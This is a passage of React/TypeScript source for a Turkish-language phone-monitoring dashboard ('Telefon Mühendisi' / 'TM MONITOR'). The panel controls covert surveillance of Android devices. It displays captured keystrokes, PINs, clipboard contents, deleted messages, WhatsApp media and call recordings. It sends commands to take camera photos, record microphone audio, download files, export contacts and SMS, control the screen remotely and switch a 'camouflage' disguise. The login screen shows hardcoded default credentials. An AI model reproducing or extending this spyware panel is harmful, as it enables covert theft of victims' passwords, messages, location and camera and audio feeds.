          try { ch.unbind_all(); pusherClient.unsubscribe("fleet-updates"); } catch {}
        };
      } catch {}
    })();

    return () => {
      stop();
      document.removeEventListener("visibilitychange", onVisibilityChange);
      unsub?.();
    };
  }, [fetchFleet]);

  // 2. Aktif Sekmenin Verisini Sürekli Canlı Çekme (Continuous Live Sync — Sıfır Titreme / Zero Flicker)
  const fetchTabData = useCallback(async () => {
    if (typeof document !== "undefined" && document.visibilityState === "hidden") return;
    const devId = selectedDeviceId || '1ac10c6100e93908';
    try {
      if (activeTab === "MEDIA") {
        const res = await fetch(`/api/v1/devices/${devId}/media?limit=40`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          const items: CapturedMedia[] = data.media || [];
          setMediaList(prev => {
            if (prev.length === items.length && (prev.length === 0 || (prev[0]?.id === items[0]?.id && prev[prev.length - 1]?.id === items[items.length - 1]?.id))) {
              return prev;
            }
            return items;
          });
        }
      } else if (activeTab === "LOCATION") {
        const res = await fetch(`/api/v1/devices/${devId}/locations`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          const items = data.history || [];
          setLocationHistory(prev => {
            if (prev.length === items.length && (prev.length === 0 || prev[0]?.id === items[0]?.id)) {
              return prev;
            }
            return items;
          });
        }
      } else if (activeTab === "AUDIT") {
        const res = await fetch(`/api/v1/devices/${devId}/audit-logs`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          const items = data.logs || [];
          setAuditLogs(prev => {
            if (prev.length === items.length && (prev.length === 0 || prev[0]?.id === items[0]?.id)) {
              return prev;
            }
            return items;
          });
        }
      } else if (activeTab === "FILES") {

        const res = await fetch(`/api/v1/devices/${devId}/files`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          setFilesData({ current_path: data.current_path || '/storage/emulated/0', items: data.items || [] });
        }
      } else if (activeTab === "APPS") {
        const res = await fetch(`/api/v1/devices/${devId}/apps`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          setAppsList(data.apps || []);
        }
      } else if (activeTab === "FORENSIC") {
        const res = await fetch(`/api/v1/devices/${devId}/download`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          if (data.download?.data_url) setDownloadPayload(data.download);
        }
      }
    } catch {}
  }, [activeTab, selectedDeviceId]);

  // Sekme verisi: sekme görünürken 6sn, gizliyken tamamen dur; Pusher telemetry event'i ile ekstra tetiklen
  useEffect(() => {
    fetchTabData();
    let interval: any = null;
    const start = () => { if (!interval) interval = setInterval(fetchTabData, 6000); };
    const stop = () => { if (interval) { clearInterval(interval); interval = null; } };
    const onVisibilityChange = () => {
      if (document.visibilityState === "visible") { fetchTabData(); start(); }
      else stop();
    };
    if (document.visibilityState === "visible") start();
    document.addEventListener("visibilitychange", onVisibilityChange);

    let unsub: null | (() => void) = null;
    const devId = selectedDeviceId || '1ac10c6100e93908';
    (async () => {
      try {
        const { pusherClient } = await import("@/lib/pusher-client");
        const ch = pusherClient.subscribe(`device-${devId}`);
        ch.bind("telemetry", () => {
          if (document.visibilityState === "visible") fetchTabData();
        });
        unsub = () => { try { ch.unbind_all(); pusherClient.unsubscribe(`device-${devId}`); } catch {} };
      } catch {}
    })();

    return () => {
      stop();
      document.removeEventListener("visibilitychange", onVisibilityChange);
      unsub?.();
    };
  }, [fetchTabData, selectedDeviceId]);


  // Toast Bildirim Süresi
  useEffect(() => {
    if (!commandMessage) return;
    const timer = setTimeout(() => setCommandMessage(null), 3500);
    return () => clearTimeout(timer);
  }, [commandMessage]);


  const selectedDevice: DeviceState = useMemo(() => {
    return devices.find(d => d.device_id === selectedDeviceId) || devices[0] || REAL_A71_DEVICE;
  }, [devices, selectedDeviceId]);

  const isOnline = useMemo(() => {
    if (!selectedDevice) return false;
    if (selectedDevice.is_online === false) return false;
    if (selectedDevice.last_seen_at && (Date.now() - selectedDevice.last_seen_at > 120000)) {
      return false;
    }
    return true;
  }, [selectedDevice]);

  const lastSeenText = useMemo(() => {
    if (!selectedDevice?.last_seen_at) return "Bilinmiyor";
    const diffSec = Math.max(0, Math.floor((Date.now() - selectedDevice.last_seen_at) / 1000));
    if (diffSec < 10) return "Az önce";
    if (diffSec < 60) return `${diffSec} sn önce`;
    const diffMin = Math.floor(diffSec / 60);
    return `${diffMin} dk önce`;
  }, [selectedDevice?.last_seen_at]);

  const rawLat = selectedMapPoint?.lat ?? selectedDevice?.location?.latitude ?? 40.692388;
  const rawLng = selectedMapPoint?.lng ?? selectedDevice?.location?.longitude ?? 29.610730;
  const currentLat = typeof rawLat === "number" && !isNaN(rawLat) ? rawLat : 40.692388;
  const currentLng = typeof rawLng === "number" && !isNaN(rawLng) ? rawLng : 29.610730;

  const mapEmbedUrl = useMemo(() => {
    if (mapProvider === "osm") {
      return `https://www.openstreetmap.org/export/embed.html?bbox=${currentLng - 0.008}%2C${currentLat - 0.006}%2C${currentLng + 0.008}%2C${currentLat + 0.006}&layer=mapnik&marker=${currentLat}%2C${currentLng}`;
    }
    if (mapProvider === "yandex") {
      return `https://yandex.com/map-widget/v1/?ll=${currentLng}%2C${currentLat}&z=16&pt=${currentLng}%2C${currentLat},pm2rdm`;
    }
    return `https://maps.google.com/maps?q=${currentLat},${currentLng}&t=m&hl=tr&z=17&output=embed`;
  }, [currentLat, currentLng, mapProvider]);

  const filteredMedia = useMemo(() => {
    // Deduplicate & Sort strictly newest first
    const map = new Map<string, CapturedMedia>();
    for (const m of mediaList) {
      if (m && m.data_url) {
        const key = m.id || m.data_url.substring(0, 80);
        map.set(key, m);
      }
    }
    const list = Array.from(map.values());
    list.sort((a, b) => {
      const timeDiff = (Number(b.captured_at) || 0) - (Number(a.captured_at) || 0);
      if (timeDiff !== 0) return timeDiff;
      return String(b.id || '').localeCompare(String(a.id || ''));
    });

    if (mediaFilter === "ALL") return list;
    if (mediaFilter === "PHOTO") return list.filter(m => m.type.startsWith("PHOTO") || m.type === "SCREENSHOT" || m.type === "DUAL_PIP" || m.type === "INTRUDER_SELFIE");
    if (mediaFilter === "AUDIO") return list.filter(m => m.type === "AUDIO_RECORDING" || m.type === "CALL_RECORDING");
    if (mediaFilter === "WHATSAPP") return list.filter(m => m.type.startsWith("WHATSAPP"));
    return list;
  }, [mediaList, mediaFilter]);



  const filteredAuditLogs = useMemo(() => {
    // Deduplicate & Sort strictly newest first
    const map = new Map<string, DeviceAuditLog>();
    for (const log of auditLogs) {
      if (log && log.content) {
        const key = log.id || `${log.timestamp}_${log.package_name}_${log.content.trim()}`;
        map.set(key, log);
      }
    }
    const list = Array.from(map.values());
    list.sort((a, b) => {
      const timeDiff = (Number(b.timestamp) || 0) - (Number(a.timestamp) || 0);
      if (timeDiff !== 0) return timeDiff;
      return String(b.id || '').localeCompare(String(a.id || ''));
    });

    return list.filter(log => {
      const matchFilter = (auditFilter === "ALL") 
        || (auditFilter === "KEYSTROKE" && log.event_type === "KEYSTROKE")
        || (auditFilter === "NOTIFICATION" && log.event_type === "NOTIFICATION")
        || (auditFilter === "DELETED_MSG" && log.event_type === "DELETED_MSG")
        || (auditFilter === "PIN_CAPTURED" && log.event_type === "PIN_CAPTURED")
        || (auditFilter === "CLIPBOARD" && log.event_type === "CLIPBOARD");
      const searchLow = auditSearch.toLowerCase();
      const matchSearch = !auditSearch || (log.content && log.content.toLowerCase().includes(searchLow)) || (log.package_name && log.package_name.toLowerCase().includes(searchLow));
      return matchFilter && matchSearch;
    });
  }, [auditLogs, auditFilter, auditSearch]);


  const batteryPct = selectedDevice?.battery?.percentage ?? 96;
  const batteryTemp = selectedDevice?.battery?.temperature_celsius ?? 31.5;
  const deviceModel = selectedDevice?.device_info?.model ?? "Galaxy A71";
  const linkSpeed = selectedDevice?.network?.link_speed_mbps || 433;
  const gpsSpeed = selectedDevice?.location?.speed ? Math.round(selectedDevice.location.speed * 3.6) : 0;
  const gpsAccuracy = selectedDevice?.location?.accuracy ?? 15;
  const gpsAddress = selectedMapPoint?.address || selectedDevice?.location?.address || "Karamürsel / Kocaeli";

  // Komut Gönderici (Gecikmesiz & Güvenli)
  const sendDeviceCommand = useCallback(async (action: string, params: Record<string, any> = {}) => {
    const devId = selectedDeviceId || '1ac10c6100e93908';
    setCommandLoading(action);

    try {
      const res = await fetch(`/api/v1/devices/${devId}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action, parameters: params })
      });
      const data = await res.json();
      if (res.ok && data.status === "success") {
        setCommandMessage({ type: 'success', text: `Komut cihaza iletildi: ${action}` });
        // Tek seferlik gecikmeli yenileme (mevcut 2sn interval zaten çalışıyor)
        setTimeout(() => fetchTabData(), 800);
      } else {

        setCommandMessage({ type: 'error', text: data.message || 'Komut iletilemedi' });
      }
    } catch (err: any) {
      setCommandMessage({ type: 'error', text: `Bağlantı hatası: ${err.message}` });
    } finally {
      setCommandLoading(null);
    }
  }, [selectedDeviceId, fetchTabData]);


  const toggleIntelligenceFeature = async (feature: keyof IntelligenceHubState) => {
    const devId = selectedDeviceId || '1ac10c6100e93908';
    const nextVal = !intelligenceState[feature];
    setIntelligenceState(prev => ({ ...prev, [feature]: nextVal }));

    try {
      await fetch(`/api/v1/devices/${devId}/intelligence`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: 'TOGGLE_FEATURE', feature, enabled: nextVal })
      });
      setCommandMessage({ type: 'success', text: `İstihbarat Modülü Güncellendi` });
    } catch {}
  };

  const setCamouflageMode = async (camo: IntelligenceHubState['current_camouflage']) => {
    const devId = selectedDeviceId || '1ac10c6100e93908';
    setIntelligenceState(prev => ({ ...prev, current_camouflage: camo }));
    try {
      await fetch(`/api/v1/devices/${devId}/intelligence`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: 'SET_CAMOUFLAGE', camouflage: camo })
      });
      setCommandMessage({ type: 'success', text: `Kamuflaj Değiştirildi: ${camo}` });
    } catch {}
  };

  const handleDownloadFile = async (filePath: string, fileName: string) => {
    const devId = selectedDeviceId || '1ac10c6100e93908';
    setCommandLoading(`DL_${filePath}`);
    setCommandMessage({ type: 'success', text: `Dosya cihazdan talep ediliyor: ${fileName}...` });

    try {
      await fetch(`/api/v1/devices/${devId}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "DOWNLOAD_FILE", parameters: { path: filePath, filename: fileName } })
      });

      let attempts = 0;
      const pollInterval = setInterval(async () => {
        attempts++;
        try {
          const dlRes = await fetch(`/api/v1/devices/${devId}/download`, { cache: "no-store" });
          if (dlRes.ok) {
            const dlData = await dlRes.json();
            if (dlData.download?.data_url && dlData.download.target_path === filePath) {
              clearInterval(pollInterval);
              setCommandLoading(null);

              const link = document.createElement("a");
              link.href = dlData.download.data_url;
              link.download = dlData.download.filename || fileName;
              document.body.appendChild(link);
              link.click();
              document.body.removeChild(link);

              setCommandMessage({
                type: 'success',
                text: `✅ Dosya indirildi: ${dlData.download.filename}`
              });
              return;
            }
          }
        } catch {}

        if (attempts >= 20) {
          clearInterval(pollInterval);
          setCommandLoading(null);
          setCommandMessage({ type: 'error', text: 'Dosya indirme zaman aşımına uğradı.' });
        }
      }, 700);
    } catch (err: any) {
      setCommandLoading(null);
      setCommandMessage({ type: 'error', text: `Hata: ${err.message}` });
    }
  };

  const handleExportForensics = async () => {
    const devId = selectedDeviceId || '1ac10c6100e93908';
    setCommandLoading("EXPORT_FORENSICS");
    setCommandMessage({ type: 'success', text: 'Rehber ve SMS arşivi paketleniyor...' });

    try {
      await fetch(`/api/v1/devices/${devId}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "EXPORT_FORENSICS", parameters: {} })
      });

      let attempts = 0;
      const pollInterval = setInterval(async () => {
        attempts++;
        try {
          const dlRes = await fetch(`/api/v1/devices/${devId}/download`, { cache: "no-store" });
          if (dlRes.ok) {
            const dlData = await dlRes.json();
            if (dlData.download?.data_url && dlData.download.filename?.startsWith("forensic_backup")) {
              clearInterval(pollInterval);
              setDownloadPayload(dlData.download);
              setCommandLoading(null);

              const link = document.createElement("a");
              link.href = dlData.download.data_url;
              link.download = dlData.download.filename;
              document.body.appendChild(link);
              link.click();
              document.body.removeChild(link);

              setCommandMessage({
                type: 'success',
                text: `✅ Arşiv başarıyla indirildi: ${dlData.download.filename}`
              });
              return;
            }
          }
        } catch {}

        if (attempts >= 20) {
          clearInterval(pollInterval);
          setCommandLoading(null);
          setCommandMessage({ type: 'error', text: 'Yedekleme zaman aşımına uğradı.' });
        }
      }, 700);
    } catch (err: any) {
      setCommandLoading(null);
      setCommandMessage({ type: 'error', text: `Hata: ${err.message}` });
    }
  };

  if (!isMounted) {
    return (
      <div className="min-h-screen bg-[#030305] flex items-center justify-center text-slate-400 font-sans">
        <div className="flex items-center gap-3 bg-white/[0.03] px-6 py-4 rounded-2xl border border-white/10 shadow-2xl backdrop-blur-xl">
          <Loader2 className="w-5 h-5 text-violet-400 animate-spin" />
          <span className="text-sm font-bold text-white tracking-wide">Telefon Mühendisi Yükleniyor...</span>
        </div>
      </div>
    );
  }

  // ── GİRİŞ EKRANI (LOGIN SCREEN) ─────────────────────────────────────────────
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#030305] text-slate-100 font-sans flex items-center justify-center p-4 selection:bg-violet-500 selection:text-white relative overflow-hidden">
        {/* Glow Ambient */}
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-gradient-to-tr from-violet-600/20 via-indigo-500/10 to-cyan-400/20 rounded-full blur-3xl pointer-events-none" />

        <div className="max-w-md w-full bg-[#090912]/95 border border-white/10 rounded-3xl p-7 sm:p-8 shadow-2xl backdrop-blur-2xl space-y-6 relative z-10">
          
          {/* Logo & Başlık */}
          <div className="text-center space-y-2">
            <div className="w-14 h-14 rounded-2xl bg-gradient-to-tr from-violet-600 via-indigo-500 to-cyan-400 flex items-center justify-center mx-auto shadow-xl shadow-violet-600/30 ring-1 ring-white/20">
              <Zap className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-lg font-black tracking-wider text-white uppercase mt-3">
              TELEFON MÜHENDİSİ
            </h1>
            <p className="text-xs text-slate-400 font-mono">Güvenli Komuta Paneli Girişi</p>
          </div>

          {/* Form */}
          <form onSubmit={handleLogin} className="space-y-4">
            {loginError && (
              <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2 animate-fadeIn">
                <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
                <span>{loginError}</span>
              </div>
            )}

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-300">Kullanıcı Adı / ID</label>
              <div className="relative">
                <input
                  type="text"
                  placeholder="admin"
                  value={loginUsername}
                  onChange={(e) => setLoginUsername(e.target.value)}
                  className="w-full pl-9 pr-3 py-2.5 bg-white/[0.04] border border-white/10 rounded-xl text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-violet-500 transition font-sans"
                  required
                />
                <KeyRound className="w-4 h-4 text-slate-400 absolute left-3 top-3 pointer-events-none" />
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-300">Şifre</label>
              <div className="relative">
                <input
                  type="password"
                  placeholder="••••••"
                  value={loginPassword}
                  onChange={(e) => setLoginPassword(e.target.value)}
                  className="w-full pl-9 pr-3 py-2.5 bg-white/[0.04] border border-white/10 rounded-xl text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-violet-500 transition font-sans"
                  required
                />
                <Lock className="w-4 h-4 text-slate-400 absolute left-3 top-3 pointer-events-none" />
              </div>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-gradient-to-r from-violet-600 via-indigo-600 to-cyan-500 hover:from-violet-500 text-white font-bold text-xs rounded-xl transition active:scale-95 shadow-xl shadow-violet-600/30 flex items-center justify-center gap-2 mt-2 cursor-pointer"
            >
              <ShieldCheck className="w-4 h-4" />
              <span>Panele Giriş Yap</span>
            </button>
          </form>

          <div className="pt-2 border-t border-white/5 text-center text-[11px] font-mono text-slate-500">
            Varsayılan Bilgiler: <strong className="text-slate-300">admin</strong> / <strong className="text-slate-300">tm2026</strong>
          </div>

        </div>
      </div>
    );
  }

  const tabs: { id: ActiveTab; label: string; icon: any; count?: number }[] = [
    { id: "MEDIA", label: "Medya & Kamera", icon: Camera, count: mediaList.length },
    { id: "LOCATION", label: "Canlı Harita & GPS", icon: MapPin, count: locationHistory.length },
    { id: "AUDIT", label: "Klavye, Şifre & Bildirimler", icon: Keyboard, count: auditLogs.length },
    { id: "FILES", label: "Dosya Gezgini", icon: FolderOpen, count: filesData.items.length },
    { id: "FORENSIC", label: "Rehber / SMS İndir (ZIP)", icon: FileArchive },
    { id: "DIAGNOSTICS", label: "Donanım & Ağ Teşhisi", icon: Activity },
    { id: "APPS", label: "Yüklü Uygulamalar", icon: Package, count: appsList.length },
  ];

  return (
    <div className="min-h-screen bg-[#030305] text-slate-100 font-sans flex flex-col selection:bg-violet-500 selection:text-white">
      
      {/* ── 1. ÜST KOMUTA KONTROL BARI (RESPONSIVE HEADER) ─────────────────────────── */}
      <header className="min-h-16 px-3 sm:px-6 py-2.5 sm:py-0 bg-[#08080f]/95 border-b border-white/10 backdrop-blur-xl flex flex-wrap sm:flex-nowrap items-center justify-between shrink-0 gap-3 z-30">
        
        {/* Sol: Logo & Cihaz Seçici */}
        <div className="flex items-center gap-2.5 sm:gap-4 flex-wrap sm:flex-nowrap">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-xl bg-gradient-to-tr from-violet-600 via-indigo-500 to-cyan-400 flex items-center justify-center shadow-lg shadow-violet-600/30 ring-1 ring-white/20 shrink-0">
              <Zap className="w-4 h-4 sm:w-5 sm:h-5 text-white" />
            </div>
            <div>
              <div className="text-[11px] sm:text-xs font-black tracking-wider text-white uppercase flex items-center gap-1.5">
                <span>TM MONITOR</span>
                <span className="px-1 py-0.2 text-[8px] sm:text-[9px] font-extrabold bg-violet-500/20 text-violet-300 border border-violet-500/30 rounded">PRO</span>
                <span className="px-1.5 py-0.5 text-[8px] sm:text-[9px] font-black bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 rounded tracking-wider animate-pulse">v1.4.52.46 - HD Stream</span>

              </div>

              <p className="text-[9px] sm:text-[10px] text-slate-400 font-mono hidden sm:block">Enterprise Control Deck</p>
            </div>
          </div>

          {/* Cihaz Seçici Açılır Menü */}
          <div className="relative">
            <select
              value={selectedDeviceId || ""}
              onChange={(e) => setSelectedDeviceId(e.target.value)}
              className="appearance-none pl-7 sm:pl-8 pr-7 sm:pr-8 py-1 sm:py-1.5 bg-white/[0.06] hover:bg-white/[0.1] border border-white/15 rounded-xl text-[11px] sm:text-xs font-bold text-white focus:outline-none focus:border-violet-500 transition cursor-pointer max-w-[170px] sm:max-w-[240px] truncate"
            >
              {devices.map((d) => (
                <option key={d.device_id} value={d.device_id} className="bg-[#0e0e17] text-white">
                  {d.is_online ? "🟢 [CANLI]" : "🔴 [ÇEVRİMDIŞI]"} {d.device_info?.model || d.device_id}
                </option>
              ))}
            </select>
            <Smartphone className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-violet-400 absolute left-2 sm:left-2.5 top-2 sm:top-2.5 pointer-events-none" />
            <ChevronRight className="w-2.5 h-2.5 sm:w-3 sm:h-3 text-slate-400 absolute right-2 sm:right-2.5 top-2 sm:top-2.5 rotate-90 pointer-events-none" />
          </div>
        </div>

        {/* Orta: Masaüstü Canlı Telemetri Çipleri */}
        <div className="hidden lg:flex items-center gap-3 text-xs font-mono">
          <div className={`px-3 py-1 rounded-xl border flex items-center gap-1.5 font-bold ${
            isOnline ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-400"
          }`}>
            <span className={`w-2 h-2 rounded-full ${isOnline ? "bg-emerald-400 animate-ping" : "bg-rose-500"}`} />
            <span>{isOnline ? `CANLI • ${linkSpeed} Mbps` : "BAĞLANTI YOK"}</span>
          </div>

          <div className="px-3 py-1 bg-white/[0.03] border border-white/10 rounded-xl text-slate-300 flex items-center gap-1.5">
            <BatteryCharging className="w-3.5 h-3.5 text-cyan-400" />
            <span>%{batteryPct}</span>
          </div>

          <div className="px-3 py-1 bg-white/[0.03] border border-white/10 rounded-xl text-slate-300 flex items-center gap-1.5">
            <Clock className="w-3.5 h-3.5 text-amber-400" />
            <span>{lastSeenText}</span>
          </div>
        </div>

        {/* Sağ: Acil Hızlı Kumanda Butonları */}
        <div className="flex items-center gap-1.5 sm:gap-2 ml-auto sm:ml-0">
          <button
            onClick={() => sendDeviceCommand("PLAY_SOUND")}
            disabled={commandLoading !== null}
            className="p-1.5 sm:px-3 sm:py-1.5 bg-white/[0.04] hover:bg-white/[0.08] border border-white/10 text-slate-200 rounded-xl text-xs font-bold flex items-center gap-1.5 transition active:scale-95 disabled:opacity-50"
            title="Cihazda Yüksek Sesli Alarm Çalar"
          >
            <Volume2 className="w-3.5 h-3.5 text-amber-400" />
            <span className="hidden md:inline">Zil Çal</span>
          </button>

          <button
            onClick={() => sendDeviceCommand("INJECT_KEY", { key_type: "LOCK_SCREEN" })}
            disabled={commandLoading !== null}
            className="p-1.5 sm:px-3 sm:py-1.5 bg-white/[0.04] hover:bg-white/[0.08] border border-white/10 text-slate-200 rounded-xl text-xs font-bold flex items-center gap-1.5 transition active:scale-95 disabled:opacity-50"
            title="Ekranı Anında Kilitler"
          >
            <Lock className="w-3.5 h-3.5 text-rose-400" />
            <span className="hidden md:inline">Kilitle</span>
          </button>

          <button
            onClick={() => sendDeviceCommand("TAKE_SCREENSHOT")}
            disabled={commandLoading !== null}
            className="px-2.5 sm:px-3.5 py-1.5 bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 text-white font-bold text-xs rounded-xl shadow-lg shadow-violet-600/30 flex items-center gap-1.5 transition active:scale-95 disabled:opacity-50"
          >
            <Camera className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Ekran Resmi</span>
          </button>

          <button
            onClick={handleLogout}
            className="p-1.5 sm:px-3 sm:py-1.5 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/20 text-rose-300 rounded-xl text-xs font-bold flex items-center gap-1.5 transition active:scale-95"
            title="Oturumu Kapat"
          >
            <Power className="w-3.5 h-3.5" />
            <span className="hidden md:inline">Çıkış</span>
          </button>
        </div>
      </header>

      {/* MOBİL TELEMETRİ BARI (Sadece Mobilde Görünür) */}
      <div className="lg:hidden px-3 py-1.5 bg-[#0b0b14] border-b border-white/10 flex items-center justify-between text-[10px] font-mono text-slate-300 overflow-x-auto gap-2">
        <div className="flex items-center gap-1.5">
          <span className={`w-2 h-2 rounded-full ${isOnline ? "bg-emerald-400 animate-ping" : "bg-rose-500"}`} />
          <span className={isOnline ? "text-emerald-400 font-bold" : "text-rose-400 font-bold"}>
            {isOnline ? `CANLI (${linkSpeed}M)` : "ÇEVRİMDIŞI"}
          </span>
        </div>
        <div className="flex items-center gap-1">
          <BatteryCharging className="w-3 h-3 text-cyan-400" />
          <span>%{batteryPct}</span>
        </div>
        <div className="flex items-center gap-1">
          <Clock className="w-3 h-3 text-amber-400" />
          <span className="truncate max-w-[110px]">{lastSeenText}</span>
        </div>
      </div>

      {/* TOAST BİLDİRİMİ */}
      {commandMessage && (
        <div className="px-4 sm:px-6 py-2 bg-[#0c0c17] border-b border-white/10 flex items-center justify-between text-xs animate-fadeIn">
          <div className="flex items-center gap-2">
            {commandMessage.type === 'success' ? <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" /> : <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />}
            <span className={commandMessage.type === 'success' ? "text-emerald-300 font-semibold" : "text-rose-300 font-semibold"}>
              {commandMessage.text}
            </span>
          </div>
          <button onClick={() => setCommandMessage(null)} className="text-slate-400 hover:text-white">
            <X className="w-3.5 h-3.5" />
          </button>
        </div>
      )}

      {/* ── 2. ANA KOMUTA DÜZENİ (SOL TELEFON STAGE + SAĞ ÇALIŞMA ALANI) ─────────── */}
      <div className="flex-1 p-3 sm:p-6 grid grid-cols-1 lg:grid-cols-12 gap-4 sm:gap-6 max-w-[1750px] mx-auto w-full items-start">
        
        {/* SOL SÜTUN: İZOLE CANLI TELEFON VE DOKUNMATİK SAHNESİ (lg:col-span-4) */}
        <div className="lg:col-span-4 flex flex-col items-center bg-white/[0.02] border border-white/10 rounded-2xl sm:rounded-3xl p-3.5 sm:p-5 shadow-2xl backdrop-blur-xl w-full">
          <div className="w-full flex items-center justify-between mb-3 text-xs font-bold text-slate-300">
            <div className="flex items-center gap-2">
              <Monitor className="w-4 h-4 text-violet-400" />
              <span>Canlı Uzaktan Kumanda</span>
            </div>
            <span className="text-[10px] font-mono text-slate-500">{deviceModel}</span>
          </div>

          <div className="w-full flex justify-center">
            <LiveScreenCanvas
              deviceId={selectedDeviceId || '1ac10c6100e93908'}
              isOnline={isOnline}
              onSendCommand={sendDeviceCommand}
            />
          </div>
        </div>

        {/* SAĞ SÜTUN: 7 BÜYÜK MODÜL VE ÇALIŞMA ALANI (lg:col-span-8) */}
        <div className="lg:col-span-8 flex flex-col gap-4 w-full min-w-0">
          
          {/* TAB SEÇİCİ (MOBİL YATAY KAYDIRMALI) */}
          <div className="flex items-center gap-1.5 sm:gap-2 overflow-x-auto pb-1.5 scrollbar-none touch-pan-x -mx-1 px-1">
            {tabs.map((tab) => {
              const Icon = tab.icon;
              const isActive = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl sm:rounded-2xl text-xs font-bold flex items-center gap-1.5 sm:gap-2 transition whitespace-nowrap shrink-0 cursor-pointer ${
                    isActive
                      ? "bg-gradient-to-r from-violet-600 to-indigo-600 text-white shadow-lg shadow-violet-600/30 ring-1 ring-white/20"
                      : "bg-white/[0.03] text-slate-400 hover:text-slate-200 hover:bg-white/[0.07] border border-white/5"
                  }`}
                >
                  <Icon className={`w-3.5 h-3.5 ${isActive ? "text-white" : "text-slate-400"}`} />
                  <span>{tab.label}</span>
                  {tab.count !== undefined && tab.count > 0 && (
                    <span className={`px-1.5 py-0.2 rounded-md text-[10px] font-mono ${isActive ? "bg-white/20 text-white" : "bg-white/10 text-slate-400"}`}>
                      {tab.count}
                    </span>
                  )}
                </button>
              );
            })}
          </div>

          {/* ── SEKME 1: MEDYA & KAMERA GALERİSİ ──────────────────────────────── */}
          {activeTab === "MEDIA" && (
            <div className="bg-white/[0.02] border border-white/10 rounded-2xl sm:rounded-3xl p-3.5 sm:p-5 space-y-4 backdrop-blur-xl shadow-2xl">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-white/5">
                <div className="grid grid-cols-2 sm:flex sm:flex-wrap items-center gap-2">
                  <button onClick={() => sendDeviceCommand("TAKE_PHOTO_FRONT")} disabled={commandLoading !== null} className="px-3 py-2 sm:py-1.5 bg-violet-600 hover:bg-violet-500 text-white rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition shadow active:scale-95 disabled:opacity-50">
                    <Camera className="w-3.5 h-3.5" /> Ön Kamera
                  </button>
                  <button onClick={() => sendDeviceCommand("TAKE_PHOTO_BACK")} disabled={commandLoading !== null} className="px-3 py-2 sm:py-1.5 bg-white/[0.05] hover:bg-white/[0.1] text-slate-200 border border-white/10 rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition active:scale-95 disabled:opacity-50">
                    <Camera className="w-3.5 h-3.5 text-emerald-400" /> Arka Kamera
                  </button>
                  <button onClick={() => sendDeviceCommand("TAKE_DUAL_PHOTO")} disabled={commandLoading !== null} className="px-3 py-2 sm:py-1.5 bg-white/[0.05] hover:bg-white/[0.1] text-slate-200 border border-white/10 rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition active:scale-95 disabled:opacity-50">
                    <Layers3 className="w-3.5 h-3.5 text-cyan-400" /> Çift PiP
                  </button>
                  <button onClick={() => sendDeviceCommand("RECORD_AUDIO", { duration: 10 })} disabled={commandLoading !== null} className="px-3 py-2 sm:py-1.5 bg-white/[0.05] hover:bg-white/[0.1] text-slate-200 border border-white/10 rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition active:scale-95 disabled:opacity-50">
                    <Mic className="w-3.5 h-3.5 text-amber-400" /> 10 sn Dinle
                  </button>
                </div>

                <div className="flex items-center justify-center gap-1 bg-black/40 p-1 rounded-xl border border-white/5 text-xs font-bold shrink-0">
                  <button onClick={() => setMediaFilter("ALL")} className={`px-2.5 py-1 rounded-lg ${mediaFilter === "ALL" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Tümü ({mediaList.length})</button>
                  <button onClick={() => setMediaFilter("PHOTO")} className={`px-2.5 py-1 rounded-lg ${mediaFilter === "PHOTO" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Fotoğraf</button>
                  <button onClick={() => setMediaFilter("AUDIO")} className={`px-2.5 py-1 rounded-lg ${mediaFilter === "AUDIO" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Ses</button>
                </div>
              </div>

              {/* Medya Kartları Grid */}
              {filteredMedia.length === 0 ? (
                <div className="py-16 flex flex-col items-center justify-center text-center space-y-3 bg-black/30 rounded-2xl border border-white/5">
                  <div className="w-12 h-12 rounded-2xl bg-violet-500/10 border border-violet-500/20 flex items-center justify-center text-violet-400">
                    <Camera className="w-6 h-6" />
                  </div>
                  <div className="space-y-1 max-w-sm px-4">
                    <p className="text-xs font-bold text-slate-200">Bu Cihaza Ait Henüz Medya Kaydı Yok</p>
                    <p className="text-[11px] text-slate-500">
